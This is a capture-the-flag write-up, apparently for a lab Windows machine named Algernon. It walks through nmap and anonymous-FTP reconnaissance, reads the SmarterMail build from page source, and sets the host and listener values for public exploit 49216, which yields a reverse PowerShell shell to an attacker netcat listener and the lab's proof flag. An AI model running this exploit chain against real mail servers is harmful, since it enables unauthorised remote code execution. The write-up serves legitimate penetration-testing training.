---
title: "Algernon - Writeup"
linkTitle: "Algernon"
weight: 4
featured: true
platform: "PG"
name: "Algernon"
os: "Windows"
difficulty: "Medium"
release: "28 Jun 2026"
ip: "192.168.154.65"
# Drop a real avatar at static/img/pg/algernon.png and uncomment:
# avatar: "/img/pg/algernon.png"
tags: ["windows", "ftp", "smartermail", "unauthenticated-rce", "exploit-db-49216", "system-shell"]
description: "Medium Windows box. Anonymous FTP is a dead end, but the SmarterMail web interface leaks its exact build number, leading to a known unauthenticated RCE against its internal build service."
---

{{< htb name="Algernon" os="Windows" difficulty="Medium" release="28 Jun 2026" ip="192.168.154.65" platform="PG" >}}

## Reconnaissance

```
(root㉿kali)# nmap 192.168.154.65 -p21,80,135,139,445,9998 -sCV
```

```
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
80/tcp   open  http          Microsoft IIS httpd 10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
9998/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_Requested resource was /interface/root
```

Anonymous FTP and a second web interface on port 9998 stand out immediately.

## Enumeration

Anonymous login works straight away.

```
(root㉿kali)# ftp 192.168.154.65
Name (192.168.154.65:root): anonymous
Password:
230 User logged in.
```

```
ftp> ls
04-29-20  10:31PM       <DIR>          ImapRetrieval
06-28-26  09:56AM       <DIR>          Logs
04-29-20  10:31PM       <DIR>          PopRetrieval
04-29-20  10:32PM       <DIR>          Spool
```

`Logs` looks promising, pull everything down and search it.

```
ftp> cd Logs
ftp> mget *
```

```
(root㉿kali)# grep -RF "version" .
(root㉿kali)# grep -RF "*pass*" .
```

Nothing useful comes back, no credentials, no version strings. FTP is a dead end here, so pivot to the second web service instead.

The port 9998 interface turns out to be `/interface/root`, a **SmarterMail** login page. Viewing the page source leaks the exact product build directly in the JavaScript variables.

![SmarterMail login page source revealing the exact product build](/img/pg/algernon/01-smartermail-version.png)

```
var stProductVersion = "100.0.6919";
var stProductBuild = "6919 (Dec 11, 2018)";
```

**SmarterMail Build 6919** is an old enough build to have a public, unauthenticated RCE.

## Initial Foothold

[Exploit-DB 49216](https://www.exploit-db.com/exploits/49216) targets this exact build, an unauthenticated RCE against SmarterMail's internal build service on port 17001. Only the connection details need editing.

```python
HOST='192.168.154.65'
PORT=17001
LHOST='192.168.45.186'
LPORT=4411
```

Start a listener and run the exploit.

```
(root㉿kali)# rlwrap nc -lvnp 4411
(root㉿kali)# python3 49216.py
```

```
listening on [any] 4411 ...
connect to [192.168.45.186] from (UNKNOWN) [192.168.154.65] 49904

PS C:\Windows\system32>
```

A PowerShell session lands directly. Read the flag straight off the Administrator's desktop to confirm privilege level.

```
PS C:\Windows\system32> cat /Users/Administrator/Desktop/proof.txt
```

```
d8fd9cf20f40f8bf2d87e2aad92049c6
```

## Privilege Escalation

None needed. SmarterMail's build service normally runs as a high-privilege local service account, so the RCE against it lands with enough access to read the Administrator's own files immediately.

## Lessons learned

- Don't over-invest in a lead that stops producing results. Anonymous FTP looked promising, but once the logs turned up nothing, the right move was pivoting to the next open service rather than digging further into a dead end.
- Viewing page source is still one of the fastest fingerprinting techniques available. A single JavaScript variable gave the exact product build, which turned straight into a working exploit-db result, no guessing needed.
- Match the exact version, not just the product name. "SmarterMail" alone wouldn't have found this exploit, the specific build number is what made the search precise enough to land on a working, unauthenticated RCE.
